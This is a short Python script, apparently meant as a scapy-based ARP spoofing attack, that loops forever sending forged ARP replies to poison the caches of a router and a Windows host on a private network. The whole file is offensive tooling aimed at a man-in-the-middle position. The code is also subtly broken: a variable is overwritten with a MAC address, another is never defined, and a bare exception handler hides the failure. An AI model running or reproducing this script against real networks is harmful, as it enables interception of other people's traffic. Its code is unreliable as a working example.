from scapy.all import *
import os
import sys
import time

def attack():
    router_ip = "10.10.111.1"
    windows_ip = "10.10.111.100"

    #gets macs of machines using ips
    router_mac = getmacbyip(router_ip)
    windows_ip = getmacbyip(windows_ip)

    while(True):
        try:
            send(ARP(op = 2, pdst = router_ip, psrc = windows_ip, hwdst = windows_mac))
            send(ARP(op = 2, pdst = windows_ip, psrc = router_ip, hwdst = router_mac))
        except:
            pass
    
    time.sleep(0.2)

def main():
    attack()

if __name__ == "__main__":
    main()